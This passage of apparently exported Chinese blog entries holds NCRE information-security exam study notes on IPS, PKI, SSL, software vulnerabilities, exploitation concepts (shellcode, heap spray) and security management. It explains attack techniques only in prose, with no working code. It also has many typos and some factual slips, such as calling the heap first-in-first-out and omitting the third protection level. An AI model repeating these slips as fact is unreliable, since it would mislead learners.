<p>入侵防御系统的检测技术和入侵检测系统是相似的，可以在网络层、传输层和应用层进行攻击行为的检测和防御。和入侵检测系统在网络中旁边部署不同的是，入侵防御系统是通过直接串联到网络链路中实现其防御功能的。当入侵防御系统接收到外部数据流量时，如果检测到数据包中的攻击特征，就会自动地将此数据包丢掉或采取措施将攻击源阻断，从而将攻击数据包挡在网络边界之外。</p>
<h1 id="说明防火墙和入侵防御系统功能的区别"><a href="#说明防火墙和入侵防御系统功能的区别" class="headerlink" title="说明防火墙和入侵防御系统功能的区别"></a>说明防火墙和入侵防御系统功能的区别</h1><p>防火墙位于可惜和不可信网络间，通过检测和过滤网络交换的信息，达到保护内部可信网络的目的</p>
<p>入侵防御系统采用串联方式部署在网络中，实现网络层、传输层和应用层的全面检测和拦截，具有拦截恶意流量、实现对传输内容的深度检测和安全防护、对网络流量检测的同时进行过滤等功能</p>
<h1 id="介绍-PKI-中基于数字证书的信任链传递关系原理"><a href="#介绍-PKI-中基于数字证书的信任链传递关系原理" class="headerlink" title="介绍 PKI 中基于数字证书的信任链传递关系原理"></a>介绍 PKI 中基于数字证书的信任链传递关系原理</h1><p>公共密钥基础设施（Public Key Infrastructure , PKI）</p>
<p>证书认证机构（Certificate Authority , CA）</p>
<p>证书注册机构（Registration Authority , RA）</p>
<p>证书办法系统（Certificate Distribution System , CDS）</p>
<p>通过真实的数字证书来相信网络用户身份的真实性是通过信任链的传递关系来保证的。证书是由证书认证机构颁发的，证书认证机构颁发证书之前要对申请证书者的身份进行确认，只有经过身份核实的才签发证书。且证书中含有证书认证机构的数字签名。如果证书中的信息被篡改，则可通过证书认证机构公钥验证出来。在可以信任证书认证机构的条件下，证书认证机构又信任证书拥有者，因此给证书拥有者颁发来数字证书。如果能验证数字证书是真实的没有被篡改过，则借由这个信任链的传递关系就可以通过真实的数字证书确认并相信在数字证书中证书拥有者的身份。简而言之，证书拥有者可以通过数字证书向网络系统中的其他实体证明自己的身份。</p>
<h1 id="介绍-SSL-协议的连接过程"><a href="#介绍-SSL-协议的连接过程" class="headerlink" title="介绍 SSL 协议的连接过程"></a>介绍 SSL 协议的连接过程</h1><ul>
<li>客户端发送 ClientHello 请求</li>
<li>服务器发送 ServerHello 消息</li>
<li>如果服务器请求客户端提供证书，客户端将发送 Certificate 消息，将数字证书发给服务器，服务器对该证书进行验证</li>
<li>服务器证书发给客户端后，客户端对服务器的证书进行验证</li>
<li>客户端与服务器端根据 <code>pre_master_secret</code> 以及客户端与服务器的随机数组各自独立计算出会话密钥和 MAC 密钥</li>
<li>客户端和服务器彼此间交换各自的握手完成信息</li>
</ul>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题5</title>
    <url>/posts/31a4e606/</url>
    <content><![CDATA[<p><strong>五、应用安全</strong></p>
<h1 id="简述软件漏洞概念中包含的3个要素"><a href="#简述软件漏洞概念中包含的3个要素" class="headerlink" title="简述软件漏洞概念中包含的3个要素"></a>简述软件漏洞概念中包含的3个要素</h1><ul>
<li>漏洞是计算机系统本身存在的缺陷</li>
<li>漏洞的存在和利用都有一定的环境要求</li>
<li>漏洞存在的本身是没有危害的，只有被攻击者恶意利用，才能给计算机带来威胁和损失</li>
</ul>
<a id="more"></a>
<h1 id="简述软件漏洞的四个特点"><a href="#简述软件漏洞的四个特点" class="headerlink" title="简述软件漏洞的四个特点"></a>简述软件漏洞的四个特点</h1><ul>
<li>危害性大</li>
<li>影响广泛</li>
<li>存在的长久性</li>
<li>隐蔽性</li>
</ul>
<h1 id="按照软件漏洞被攻击者利用的地方进行分类，软件漏洞可以分为哪几类？"><a href="#按照软件漏洞被攻击者利用的地方进行分类，软件漏洞可以分为哪几类？" class="headerlink" title="按照软件漏洞被攻击者利用的地方进行分类，软件漏洞可以分为哪几类？"></a>按照软件漏洞被攻击者利用的地方进行分类，软件漏洞可以分为哪几类？</h1><ul>
<li>本地利用漏洞</li>
<li>远程利用漏洞</li>
</ul>
<h1 id="根据漏洞生命周期不同阶段进行划分，软件漏洞可以分为哪几类？"><a href="#根据漏洞生命周期不同阶段进行划分，软件漏洞可以分为哪几类？" class="headerlink" title="根据漏洞生命周期不同阶段进行划分，软件漏洞可以分为哪几类？"></a>根据漏洞生命周期不同阶段进行划分，软件漏洞可以分为哪几类？</h1><ul>
<li>0day 漏洞：指未公开状态的漏洞</li>
<li>1day 漏洞：发布补丁时间不长的漏洞</li>
<li>已公开漏洞</li>
</ul>
<h1 id="描述软件漏洞危险等级的划分"><a href="#描述软件漏洞危险等级的划分" class="headerlink" title="描述软件漏洞危险等级的划分"></a>描述软件漏洞危险等级的划分</h1><ul>
<li>紧急，危险级别最高的等级，微软定义为严重</li>
<li>重要，微软定义为重要</li>
<li>中危，微软定义为中等</li>
<li>低危，微软定义为警告</li>
</ul>
<h1 id="简单说明国内外知名漏洞库及其包含漏洞信息的特点"><a href="#简单说明国内外知名漏洞库及其包含漏洞信息的特点" class="headerlink" title="简单说明国内外知名漏洞库及其包含漏洞信息的特点"></a>简单说明国内外知名漏洞库及其包含漏洞信息的特点</h1><ul>
<li>CVE ： 通用漏洞列表，软件漏洞行业标准，安全漏洞命名机制的规范化标准化，成为评价相应入侵检测和漏洞扫描等工具和数据库的基准</li>
<li>BygTraq ：安全焦点的 BugTraq邮件列表， 被认为是互联网上最广泛且最可信的安全信息源，包含的漏洞列表是目前最大的漏洞数据库之一，很多最新的的技术讨论和很多 0day 漏洞都是出现在这里，并以 CVE 交叉索引，漏洞编号 BID </li>
<li>NVD ：美国国家漏洞数据库，目前世界上数据量最大，条目最多的漏洞数据库之一，与 CVE 同步和兼容</li>
<li>CNNVD ：中国国家信息安全漏洞库，是中国信息安全测评中心切实履行漏洞分析和风险评估的职能，负载建设运维国际级信息安全漏洞库，为我国信息安全保障提供基础服务。定向通报服务是测评中心面向各级政府机关及企事业单位，及时、准确推送涵盖以漏洞信息为核心的各类数据及应用服务</li>
<li>CNVD ：国家互联网应急中心，是工信部领导下的国家级安全应急机构，是 CNCERT 联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库</li>
</ul>
<h1 id="介绍缓冲区溢出的原理"><a href="#介绍缓冲区溢出的原理" class="headerlink" title="介绍缓冲区溢出的原理"></a>介绍缓冲区溢出的原理</h1><p>缓冲区是一块连续的内存区域，用于存放程序运行时加载到内存的运行代码和数据。缓冲区溢出是指程序运行时，向固定大小的缓冲区写入超出其容量的数据，多余的数据会越过缓冲区的边界覆盖相邻内存空间，从而造成溢出。缓冲区的大小是由用户输入的数据决定的，如果程序不对用户输入的超长数据做长度检查，同时用户又对程序进行非法操作或错误输入，就会造成缓冲区溢出。</p>
<p>缓冲区溢出攻击是指发送缓冲区溢出时，溢出的数据会覆盖相邻内存空间的返回地址、函数指针、堆管理结构等合法数据，从而使程序运行失败，或发生转向去执行其他程序代码，或执行预先注入内存缓冲区中的代码。</p>
<h1 id="说明操作系统的内存管理机制"><a href="#说明操作系统的内存管理机制" class="headerlink" title="说明操作系统的内存管理机制"></a>说明操作系统的内存管理机制</h1><p>操作系统中的每一个进程都会被分配一块独立的虚拟地址空间，用以保存进程运行时的数据和代码，虚拟地址空间是实际空间的映射。</p>
<p><strong>堆（heap）是先进先出的数据结构，往高地址增长</strong></p>
<p><strong>栈（stack）是后进先出的数据结构，往低地址增长</strong></p>
<h1 id="介绍堆溢出和栈溢出的原理"><a href="#介绍堆溢出和栈溢出的原理" class="headerlink" title="介绍堆溢出和栈溢出的原理"></a>介绍堆溢出和栈溢出的原理</h1><p>堆是内存中用于存放动态数据的区域，堆空间由地址向高地址方向增长，堆溢出指堆中发生缓冲区溢出，利用堆溢出向内存单元写入任意数据，实现改写内存中的关键数据，达到攻击目的</p>
<p>栈的存取采用先进后出的策略，程序用它来保存函数调用时的有关信息，如函数参数、返回地址，函数中的非静态局部变量存放在栈中，栈溢出是缓冲区中最简单的一种，通过溢出数据覆盖返回地址，程序会转到覆盖后的地址指向的程序</p>
<h1 id="介绍格式化字符串漏洞、整数溢出漏洞的原理"><a href="#介绍格式化字符串漏洞、整数溢出漏洞的原理" class="headerlink" title="介绍格式化字符串漏洞、整数溢出漏洞的原理"></a>介绍格式化字符串漏洞、整数溢出漏洞的原理</h1><p>C 语言中的格式化函数允许可变参数，它根据传人的格式字符串获知可变参数的个数和类型，并依据格式化符号进行参数的输出。如果调用这些函数时，给出了格式符号串，但没有提供实际对应参数，这些函数会将格式化字符串后面的多个栈中的内容弹出作为参数，并根据格式化符号将其输出</p>
<p>整数分为无符号和有符号两类，对整数进行加、乘等运算时，计算的结果大于该类型的整数所表示的范围，就会发生整数溢出，分为：存储溢出、运算溢出、符号问题</p>
<h1 id="介绍数组越界漏洞、写污点值到污点地址漏洞，以及内存地址对象破坏性调用漏洞的原理"><a href="#介绍数组越界漏洞、写污点值到污点地址漏洞，以及内存地址对象破坏性调用漏洞的原理" class="headerlink" title="介绍数组越界漏洞、写污点值到污点地址漏洞，以及内存地址对象破坏性调用漏洞的原理"></a>介绍数组越界漏洞、写污点值到污点地址漏洞，以及内存地址对象破坏性调用漏洞的原理</h1><ul>
<li><p>数组越界漏洞：由于不正确的数组访问造成，通过精心构造超出数组范围的索引值，就能对任意内存地址进行读写操作</p>
</li>
<li><p>写污点值到污点地址漏洞：通过精心选择污点地址和污点值，列用这种漏洞就能改写系统内核的关键数据结构。污点值为可能引发漏洞的输入值，污点地址为触发漏洞的潜在地址。</p>
</li>
<li>内存地址对象破坏性调用漏洞：指某对象保存的内存地址写入一个变量中，攻击者通过调用初始化或释放功能的异常操作，将保存对象的内存地址进行释放，从而导致读取变量中保存的内存地址以期访问某对象的过程，从而触发内存访问异常。 </li>
</ul>
<h1 id="介绍漏洞利用的概念和-shellcode-的编写方法"><a href="#介绍漏洞利用的概念和-shellcode-的编写方法" class="headerlink" title="介绍漏洞利用的概念和 shellcode 的编写方法"></a>介绍漏洞利用的概念和 shellcode 的编写方法</h1><p>实施攻击前，需要做大量的调试工作，包括了解存放缓冲区溢出漏洞的程序有几个输入参数，哪个输入参数会造成缓冲区溢出，如何构造输入参数的长度和内容，以便使缓冲区的偏移距离恰好能覆盖返回地址，并将攻击者构造的可执行 shellcode 代码的地址写入到返回地址。根据软件漏洞具体条件构造相应输入参数和 shellcode 代码，最终实现获得程序控制权的工程，就是漏洞利用，一般用 exploit 来表示。</p>
<p>shellcode 代码是一段机器指令，可实现攻击者指定的操作，shellcode 通称缓冲区溢出攻击中植入的一段以获得执行权限的代码</p>
<p>shellcode 可用 C 语言编写，编译后用 OllyDbg加载其可执行文件，在从中选中所需的机器代码，也可通过 IDA Pro 等反编译工具从 PE 文件中得到对应的机器代码</p>
<p>对于Linux 系统 shellcode 中要实现的功能主要是通过系统调用来完成，而每个系统调用都有固定的系统调用号</p>
<p>对于 Windows 系统，虽然 Windows 也有系统调用，但都是封装在高级的 API 中调用的，且不同的 Service Pack 版本的操作系统其 API 都可能有所改动，所以不可能直接调用。需要采用动态的方法获取 API 地址，从而编写 shellcode </p>
<h1 id="针对静态的-shellcode-地址、动态变化的-shellcode-地址分别说明其漏洞利用技术的原理"><a href="#针对静态的-shellcode-地址、动态变化的-shellcode-地址分别说明其漏洞利用技术的原理" class="headerlink" title="针对静态的 shellcode 地址、动态变化的 shellcode 地址分别说明其漏洞利用技术的原理"></a>针对静态的 shellcode 地址、动态变化的 shellcode 地址分别说明其漏洞利用技术的原理</h1><p>存在溢出漏洞的程序是一个操作系统每次启动都要加载的程序，操作系统启动时为其分配的内存地址一般是固定的，则函数调用时分配的栈帧地址也是固定的，溢出后写入栈帧的 shellcode 代码其内存地址也是静态不变的，所以可以直接将 shellcode 代码在栈帧中的静态地址覆盖原有返回地址。在函数返回使，通过新的返回地址指向 shellcode 代码地址，从而执行 shellcode 代码</p>
<p>有些软件的漏洞存在与某些动态链接库中，这些动态链接库在进程运行时被动态加载，因而在下一次这些动态链接库被重新装载到内存中，其在内存中的栈帧地址时动态变化的，则植入的 shellcode 代码在内存中的其实地址也时变化的。在这种情况下，需要让溢出发生时，覆盖返回地址后新写入的返回地址能自动定位到 shellcode  的起始地址。</p>
<h1 id="说明针对堆漏洞的-Heap-Spray-漏洞利用的技术"><a href="#说明针对堆漏洞的-Heap-Spray-漏洞利用的技术" class="headerlink" title="说明针对堆漏洞的 Heap Spray 漏洞利用的技术"></a>说明针对堆漏洞的 Heap Spray 漏洞利用的技术</h1><p>Heap Spray 也称为堆喷洒技术，在 shellcode 的前面加上大量的滑板指令，组成一个非常长的注入的代码段。然后向系统申请大量内存，并且反复用这个注入代码段来填充。这样就使得内存空间被大量的注入代码占用，攻击者在结合漏洞利用技术，只要使程序跳转到堆中被填充了注入代码的任何地址，程序指令就会顺者滑板指令最终执行到 shellcode 代码</p>
<p>滑板指令由大量 NOP 空指令 <code>0x90</code>  填充组成的指令序列，当遇到这些 NOP 指令时，CPU 指令指针会一个指令接一个指令地执行，总结不做任何具体操作，直到滑过最后一个滑板指令后，接着执行这些指令后面的其它指令，往往后面接着的时 shellcode代码，Heap Spray 技术通过使用类 NOP 指令来进行覆盖，对 shellcode 地址的跳转准确性要求不大，从而增加来缓冲区溢出攻击的成功率</p>
<h1 id="说明微软操作系统中几种常用的漏洞防护技术"><a href="#说明微软操作系统中几种常用的漏洞防护技术" class="headerlink" title="说明微软操作系统中几种常用的漏洞防护技术"></a>说明微软操作系统中几种常用的漏洞防护技术</h1><ul>
<li>GS Stack protection ：栈保护技术，是一项缓冲区溢出的检测防护技术</li>
<li>DEP ：数据执行保护技术，可以设置内存堆栈区的代码为不可执行状态，从而方法溢出后代码的执行</li>
<li>ASLR ： 地址分布随机化，是一项将系统关键地址随机化，从而使攻击者无法获得需啊唷跳转的精确地址的技术，打乱系统中存在的固定地址</li>
<li>SafeSEH ：Windows 异常处理机制所采用的重要数据结构链表</li>
<li>SEHOP 结构化异常处理覆盖保护，是微软针对 SEH 攻击提纯的一种防护方案</li>
</ul>
<h1 id="说明软件开发生命周期的概念和阶段划分"><a href="#说明软件开发生命周期的概念和阶段划分" class="headerlink" title="说明软件开发生命周期的概念和阶段划分"></a>说明软件开发生命周期的概念和阶段划分</h1><p>软件编码人员进行软件开放过程中，一般都会遵循相应的软件开发生命周期模型用于指导编码的整个过程。计算机软件产品从需求分析、设计、编码、测试、发布到维护，类似于经历一个生命的孕育、诞生、成长、成熟、衰亡的周期，一般称为软件开发生命周期。</p>
<ul>
<li>问题的定义于规划：确定开发目标，可行性分析，指定开发计划</li>
<li>需求分析：对软件需要的各个功能进行详细分析</li>
<li>软件设计：对整个软件的系统设计（系统框架设计、各函数模块设计、数据库设计）</li>
<li>程序编码：根据软件设计文档完成直接编码，转换成可运行的程序代码，一般要制定统一、符合标准的编写规范</li>
<li>软件测试：发现软件设计或软件编码中存在的问题并进行修改，保证软件的质量</li>
<li>运行维护：纠错性维护和改进性维护</li>
</ul>
<h1 id="介绍软件开发生命周期的几种模型"><a href="#介绍软件开发生命周期的几种模型" class="headerlink" title="介绍软件开发生命周期的几种模型"></a>介绍软件开发生命周期的几种模型</h1><ul>
<li>瀑布模型/改进的瀑布模型：需求 → 分析 → 设计 → 编码 → 测试 等几个阶段，每个阶段都明确定义了产出物和验证的准则，每个阶段完成后阻止相关的评审和验证，通过后进入到下一阶段。为了提高效率，并行开发适当地重叠各个阶段的过程</li>
<li>螺旋模型：需求 → 分析 → 设计 → 开发 → 测试，加强了软件开发各个阶段的管理和控制，多阶段转化到多迭代过程中。每次迭代都包含六个步骤：确定目标和替代方案、识别项目的风险、堆技术方案进行评、开发出本次迭代的交付物、计划下一次迭代过程、提交下一次迭代的步骤和方案。螺旋模型实现了每个阶段过程中的目标制定、风险分析、交付物的评估验证，保证了软件具有较高的代码质量</li>
<li>迭代模型：遵循需求 → 设计 → 开发的瀑布模型，开发阶段可以包括多次迭代，逐步精化和修正</li>
<li>快速原型模型：也称敏捷开发，根据需求在短时间内完成可以演示的软件产品，只实现部分功能或最重要的功能</li>
</ul>
<h1 id="说明微软公司采用的软件安全开发生命周期模型12个阶段的内容"><a href="#说明微软公司采用的软件安全开发生命周期模型12个阶段的内容" class="headerlink" title="说明微软公司采用的软件安全开发生命周期模型12个阶段的内容"></a>说明微软公司采用的软件安全开发生命周期模型12个阶段的内容</h1><ul>
<li>第 0 阶段，准备阶段：通过教育培训，培养开发团队员工的安全意识</li>
<li>第 1 阶段，项目启动阶段：在项目启动时，需要将项目涉及的安全问题都分析到位，以使软件产品更安全可靠</li>
<li>第 2 阶段，定义需要遵守的安全设计原则：在编码阶段开始前，需要在设计阶段对软件安全特性进行较多考虑，并定义出安全设计的原则</li>
<li>第 3 阶段，产品风险评估：在此阶段对所以开发的产品精心风险评估，以确认开发的软件是否采用了由潜在风险的技术，或者私否有较大的隐私暴露危险性</li>
<li>第 4 阶段，风险分析：对于存在高风险的软件产品，有必要通过威胁建模开展深入的风险分析</li>
<li>第 5 阶段，创建安全文档、安全配置工具：考虑为用户提供可操作的安全指南和安全配置工具</li>
<li>第 6 阶段，安全编码策略</li>
<li>第 7 阶段，安全测试策略：协助开发团队发现可以被利用的高危漏洞</li>
<li>第 8 阶段， 开发团队自身进行全面安全分析检测：在软件产品进行验证阶段且已完成所以代码与功能开发后的一个阶段</li>
<li>第 9 阶段，最终安全评审：做最终的安全评审，以检查是否做号了提交给客户的准备</li>
<li>第 10 阶段，组建安全响应团队制定安全响应计划</li>
<li>第 11 阶段，产品发布</li>
<li>第 12 阶段，安全响应执行</li>
</ul>
<h1 id="说明主要的软件静态和动态安全检测技术"><a href="#说明主要的软件静态和动态安全检测技术" class="headerlink" title="说明主要的软件静态和动态安全检测技术"></a>说明主要的软件静态和动态安全检测技术</h1><p>静态完全检测技术包括词法分析、数据流分析、污点传播分析、符号执行、模型检查、定理证明等</p>
<p>动态安全检测技术主要包括模糊测试、智能模糊车上和动态污点分析等</p>
<h1 id="详细介绍基于软件技术的软件安全保护技术"><a href="#详细介绍基于软件技术的软件安全保护技术" class="headerlink" title="详细介绍基于软件技术的软件安全保护技术"></a>详细介绍基于软件技术的软件安全保护技术</h1><ul>
<li>注册信息验证技术</li>
<li>软件防篡改技术</li>
<li>代码混淆技术</li>
<li>软件水印技术</li>
<li>软件加壳技术</li>
<li>反调试反跟踪技术</li>
</ul>
<h1 id="说明恶意程序主要的传播技术"><a href="#说明恶意程序主要的传播技术" class="headerlink" title="说明恶意程序主要的传播技术"></a>说明恶意程序主要的传播技术</h1><ul>
<li>网站挂马</li>
<li>诱骗下载</li>
<li>通过移动存储介质传播</li>
<li>通过电子邮件和即时通信软件传播</li>
<li>通过局域网传播</li>
</ul>
<h1 id="说明恶意程序的4种检测技术"><a href="#说明恶意程序的4种检测技术" class="headerlink" title="说明恶意程序的4种检测技术"></a>说明恶意程序的4种检测技术</h1><ul>
<li>特征码查杀技术：针对已知病毒木马等恶意程序进行分析，提前典型代码特征添加到特征库中，然后根据恶意程序的特征码对文件或内存进行扫描匹配，匹配成功则检测出相应特征码对应的恶意程序</li>
<li>启发式查杀技术：通过事先分析恶意程序执行指令的顺序或特定行为的组合情况等特征，建立检测的基准行为或指令的样本库，并以这些基准行为或指令的特征来检测并确定是否是恶意程序</li>
<li>虚拟机查杀技术：在扫描恶意程序时，通过将恶意程序加载到虚拟机环境中运行，从而让恶意程序自动脱壳还原为原有状态，再进行检测查杀的技术</li>
<li>主动防御技术：通过事先挂钩系统服务派发表 SSDT 中的多个 API 函数，类如进程创建、线程创建、DLL插入等系统函数，实现对恶意程序进行全面监控</li>
</ul>
<h1 id="介绍10种常见的-Web-安全威胁手段"><a href="#介绍10种常见的-Web-安全威胁手段" class="headerlink" title="介绍10种常见的 Web 安全威胁手段"></a>介绍10种常见的 Web 安全威胁手段</h1><ul>
<li>注入</li>
<li>跨站脚本</li>
<li>跨站请求伪造</li>
<li>遭破坏的身份认证和会话管理：攻击者窃听来用户访问 HTTP 时的用户名和密码，或用户的会话。从而得到 SessionID 进而冒出用户进行 HTTP 访问的过程。</li>
<li>不安全的直接对象引用：指 Web 应用程序的开发人员将一些不应公开的对象引用直接暴露给用户，使用户可通过更改 URL 等操作直接引用对象，一个用户通过更改 URL 等操作可以成功访问到未被授权的内容。</li>
<li>安全配置错误：Web 应用的各个层次都有可能出现安全配置错误。</li>
<li>不安全的加密存储： Web 应用系统没有对敏感性资料进行加密，或采用的加密算法复杂度不高可以被轻易破解，或加密所使用的密钥非常容易检测出来。</li>
<li>没有限制的 URL 访问：URL 访问限制主要时限制未授权用户访问某些链接，一般通过隐藏来实现保护，然而在某些情况下有可能能够访问被隐藏了的链接，从而可以使用未被授权的功能。</li>
<li>传输层保护不足：攻击者利用嗅探方法就可以简单地截获网络上的数据，如果传输层上没有任何的保护措施，那对于用户和 Web 应用系统都是非常危险的。</li>
<li>为验证的重定向及转发：未经过验证的重定向将可能使用户被引导到钓鱼网站或挂马网站等恶意站点，而未经过验证的转发将可能导致用户绕过验证和授权机制。</li>
</ul>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题6</title>
    <url>/posts/a8adb7bc/</url>
    <content><![CDATA[<p><strong>六、信息安全管理</strong></p>
<h1 id="填空"><a href="#填空" class="headerlink" title="填空"></a>填空</h1><h2 id="信息安全的一个重要原则是"><a href="#信息安全的一个重要原则是" class="headerlink" title="信息安全的一个重要原则是 ___"></a>信息安全的一个重要原则是 <strong>___</strong></h2><p>技(术)管(理)并重</p>
<a id="more"></a>
<h2 id="信息安全的3个基本属性是-、-和"><a href="#信息安全的3个基本属性是-、-和" class="headerlink" title="信息安全的3个基本属性是 ___、___和___"></a>信息安全的3个基本属性是 <strong>___、___和___</strong></h2><p>机密性、完整性、可用性</p>
<h2 id="风险评估的结果可以用许多方法来提交，主要包含-、-和"><a href="#风险评估的结果可以用许多方法来提交，主要包含-、-和" class="headerlink" title="风险评估的结果可以用许多方法来提交，主要包含 \_、___和___"></a>风险评估的结果可以用许多方法来提交，主要包含 <strong><em>\</em>_、___和___</strong></h2><p>信息支持分类表、权重标准分析表、漏洞风险等级表</p>
<h2 id="信息安全管理中的风险计算公式为"><a href="#信息安全管理中的风险计算公式为" class="headerlink" title="信息安全管理中的风险计算公式为 ___"></a>信息安全管理中的风险计算公式为 <strong>___</strong></h2><p>风险 ＝ 出现漏洞的可能性 × 信息资产的价值 － 当前控制减轻的风险概率 ＋ 对漏洞了解的不确定性</p>
<h2 id="进行信息安全管理措施中，事故响应的4个阶段分别为-、-、-、-p355"><a href="#进行信息安全管理措施中，事故响应的4个阶段分别为-、-、-、-p355" class="headerlink" title="进行信息安全管理措施中，事故响应的4个阶段分别为 ___、___、___、___ p355"></a>进行信息安全管理措施中，事故响应的4个阶段分别为 <strong>___、___、___、___</strong> p355</h2><p>计划、检测、反应、恢复</p>
<h1 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h1><h2 id="简述如何确定一个信息系统的安全保护等级"><a href="#简述如何确定一个信息系统的安全保护等级" class="headerlink" title="简述如何确定一个信息系统的安全保护等级"></a>简述如何确定一个信息系统的安全保护等级</h2><p>第一级，信息系统受到破坏后，会对公民法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益</p>
<p>第二级，信息系统受到破坏后，会对公民法人和其他组织的合法权益产生严重损害，或对社会秩序和公共利益造成损害，但不损害国家安全</p>
<p>第四级，信息系统受到破坏后，会对社会秩序和公共利益造成特别严重损害，或对国家安全造成严重损害</p>
<p>第五级，信息系统受到破坏后，会国家安全造成特别严重损害</p>
<h2 id="简述信息安全发展过程中所历经的3个主要阶段以及它们各自的特点"><a href="#简述信息安全发展过程中所历经的3个主要阶段以及它们各自的特点" class="headerlink" title="简述信息安全发展过程中所历经的3个主要阶段以及它们各自的特点"></a>简述信息安全发展过程中所历经的3个主要阶段以及它们各自的特点</h2><p>通信保密阶段、计算机安全阶段、信息安全保障阶段</p>
<h2 id="在信息安全管理体系中，组织机构满足哪些基本条件之后可以向被认可的认证机构提出认证申请？"><a href="#在信息安全管理体系中，组织机构满足哪些基本条件之后可以向被认可的认证机构提出认证申请？" class="headerlink" title="在信息安全管理体系中，组织机构满足哪些基本条件之后可以向被认可的认证机构提出认证申请？"></a>在信息安全管理体系中，组织机构满足哪些基本条件之后可以向被认可的认证机构提出认证申请？</h2><ul>
<li>努力遵循法律法规的行为，已北相关机构认识</li>
<li>体系文件完全符合标准要求</li>
<li>体系已被有效实施，即组织结构在风险评估的基础上，识别出需要保护的关键信息资产、制定信息安全方针、确定安全控制目标与控制方式并实施、完成体系审核与评估活动并采取相应的纠正预防措施</li>
</ul>
<h2 id="简述自评估和检查评估的区别及优缺点"><a href="#简述自评估和检查评估的区别及优缺点" class="headerlink" title="简述自评估和检查评估的区别及优缺点"></a>简述自评估和检查评估的区别及优缺点</h2><h2 id="信息安全风险包括哪些方面？"><a href="#信息安全风险包括哪些方面？" class="headerlink" title="信息安全风险包括哪些方面？"></a>信息安全风险包括哪些方面？</h2><p>指威胁源采用恰当的威胁方式利用脆弱性造成不良后果。风险管理重的风险种类有很多，如纯粹风险、投机风险、财产风险、责任风险、人生风险、信任风险、环境风险、职业风险、自然风险、巨灾风险、社会风险、政治风险、经济风险、税收风险、法规风险等</p>
<h2 id="如何理解信息安全管理中的业务持续性管理与灾难恢复？"><a href="#如何理解信息安全管理中的业务持续性管理与灾难恢复？" class="headerlink" title="如何理解信息安全管理中的业务持续性管理与灾难恢复？"></a>如何理解信息安全管理中的业务持续性管理与灾难恢复？</h2><p>灾难恢复计划是为灾难做准备和从灾难中恢复的计划。应急计划小组必须区分灾难和事故，但在攻击发生前，这是不可能区分出来的。一个事件最初归类为事故，但后来常常判定为一个灾难。此时，机构可以改变事故相应方式，采取行动，取保价值最高的资产安全，即使在短期内被破坏的风险较大，但仍在较长事件内保有价值。另为，灾难恢复计划的关键是恢复主站点上的操作，使机构运转起来。DRP 的目标是恢复到灾难前的状态</p>
<h2 id="访问控制有哪几类？"><a href="#访问控制有哪几类？" class="headerlink" title="访问控制有哪几类？"></a>访问控制有哪几类？</h2><ul>
<li>预防性访问控制</li>
<li>探查性访问控制</li>
<li>纠正性访问控制</li>
</ul>
<h2 id="如何确定安全策略是否达到组织机构所需的安全目标？"><a href="#如何确定安全策略是否达到组织机构所需的安全目标？" class="headerlink" title="如何确定安全策略是否达到组织机构所需的安全目标？"></a>如何确定安全策略是否达到组织机构所需的安全目标？</h2><ul>
<li>安全策略是否符合法律、法规、技术标准及合同要求</li>
<li>管理层是否已批准了安全策略，并明确承诺支持策略的实施</li>
<li>安全策略是否损害来组织机构、员工及第三方的利益</li>
<li>安全策略是否实用、可操作并可以在组织机构重全面实施</li>
<li>安全策略是否满足组织机构在各个方面的安全要求</li>
<li>安全策略是否已传达给组织结构重的员工与相关利益方，并得到了他们的同意</li>
</ul>
<h2 id="在制定业务持续性计划时，要采取哪些策略？"><a href="#在制定业务持续性计划时，要采取哪些策略？" class="headerlink" title="在制定业务持续性计划时，要采取哪些策略？"></a>在制定业务持续性计划时，要采取哪些策略？</h2><p>3 重选项：热站点、暖站点和冷站点，3 重共享功能：时间共享、服务台和共有协议</p>
<p>热站点：完全配置好的计算机设备</p>
<p>暖站点：提供与热站点相同的许多服务和选项，不包括实际应用程序，或未安装和配置的应用程序</p>
<p>冷站点：只提供初步的服务和功能</p>
<h2 id="简述信息系统开发和实施的安全原则"><a href="#简述信息系统开发和实施的安全原则" class="headerlink" title="简述信息系统开发和实施的安全原则"></a>简述信息系统开发和实施的安全原则</h2><ul>
<li>主管参与</li>
<li>优化和创新</li>
<li>充分利用信息资源</li>
<li>实用和时效</li>
<li>有效安全控制</li>
<li>适用发展变化</li>
</ul>
<h2 id="我国信息安全事件分级分类方法有哪些？"><a href="#我国信息安全事件分级分类方法有哪些？" class="headerlink" title="我国信息安全事件分级分类方法有哪些？"></a>我国信息安全事件分级分类方法有哪些？</h2><h2 id="应急计划小组的成员可由哪些人员组成？"><a href="#应急计划小组的成员可由哪些人员组成？" class="headerlink" title="应急计划小组的成员可由哪些人员组成？"></a>应急计划小组的成员可由哪些人员组成？</h2><p>成员应是各利益团体的经理或代表。业务经理熟悉改领域的操作过程，所以应提供其活动的细节，说明他们能承受多大危险。项目小组的信息技术经理应熟悉可处于风险之中的系统和所需的 IRP、DRP 和 BCP ，以提供计划过程重的技术内容。信息安全经理需要监视项目的安全计划，提供威胁、漏洞、攻击的信息和计划过程中需要的恢复需求。</p>
<h2 id="组织机构需求信息安全管理体系认证的目的有哪些？"><a href="#组织机构需求信息安全管理体系认证的目的有哪些？" class="headerlink" title="组织机构需求信息安全管理体系认证的目的有哪些？"></a>组织机构需求信息安全管理体系认证的目的有哪些？</h2><ul>
<li>获得最佳的信息安全运行方式</li>
<li>保证商业安全</li>
<li>降低风险</li>
<li>避免损失</li>
<li>保持核心竞争优势</li>
<li>提高商业活动中的信誉</li>
<li>提高竞争能力</li>
<li>满足客户的要求</li>
<li>保证可持续发展</li>
<li>符合法律法规的要求</li>
</ul>
<h2 id="具有什么特征的攻击才能被界定为事故？"><a href="#具有什么特征的攻击才能被界定为事故？" class="headerlink" title="具有什么特征的攻击才能被界定为事故？"></a>具有什么特征的攻击才能被界定为事故？</h2><p>事故是对信息资产的一个攻击，它明显威胁着信息资源的机密性、完整性和可用性。如果发生了威胁信息的行为并且已完成，则盖行为就界定为一个事故。</p>
